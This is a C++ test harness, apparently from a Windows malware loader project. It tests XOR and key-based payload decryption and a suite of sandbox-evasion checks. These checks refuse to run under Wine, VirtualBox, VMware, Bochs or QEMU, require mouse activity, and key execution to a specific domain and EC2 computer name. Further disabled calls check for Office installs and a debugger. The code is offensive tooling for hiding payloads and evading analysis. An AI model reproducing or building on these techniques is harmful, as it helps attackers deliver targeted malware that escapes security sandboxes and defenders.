// _tests.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <string>
#include "sandbox_detection.h"
#include "decryption.h"
#include "utils.h"
#include <Windows.h>



using std::string;
using std::cout;
using std::endl;



int main()
{
    cout << "Beginning decryption tests" << endl;
    unsigned char* buf = new unsigned char[10];
    strcpy((char*) buf, "\x01\xFF\x01\xFF\x01\xFF\x01\xFF\x01");

    unsigned char* decrypted1 = decryption::decryptXOR('\xFE', buf, 9);
    if (strcmp((char*) "\xFF\x01\xFF\x01\xFF\x01\xFF\x01\xFF", (char*)decrypted1) == 0) {
        cout << "XOR decryption finished successfully!" << endl;
    }
    else {
        cout << "XOR decryption failed!" << endl;
    }

    unsigned char* decrypted2 = decryption::decryptKey((unsigned char*)"\xFE\x01", 2, buf, 9);
    if (strcmp((char*) "\xFF\xFE\xFF\xFE\xFF\xFE\xFF\xFE\xFF", (char*)decrypted2) == 0) {
        cout << "Decrypt key finished successfully!" << endl;
    }
    else {
        cout << "decrypt key failed" << endl;
    }



    cout << "Beginning sandbox detection tests" << endl;
    sandboxDetection::requireJoinedToDomain((char*) "EC2AMAZ-L3L7VAE");
    sandboxDetection::requireComputerName((char*)"EC2AMAZ-L3L7VAE");
    sandboxDetection::requireResolvableDomainName((char*)"google.com");
    sandboxDetection::requireNotWine();
    sandboxDetection::requireNotVbox();
    sandboxDetection::requireNotVmware();
    sandboxDetection::requireNotBochsEmulator();
    sandboxDetection::requireNotQemu();
    sandboxDetection::requireMouseActivity(3);

    // NOTE: WILL ALWAYS FAIL IF YOU RUN IN DEV VM
    //sandboxDetection::requireCommonMsOfficeApplicationsInstalled();

    // NOTE: WILL ALWAYS FAIL IF YOU RUN IN VISUAL STUDIO
    //sandboxDetection::requireNoDebuggerAttached();


}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
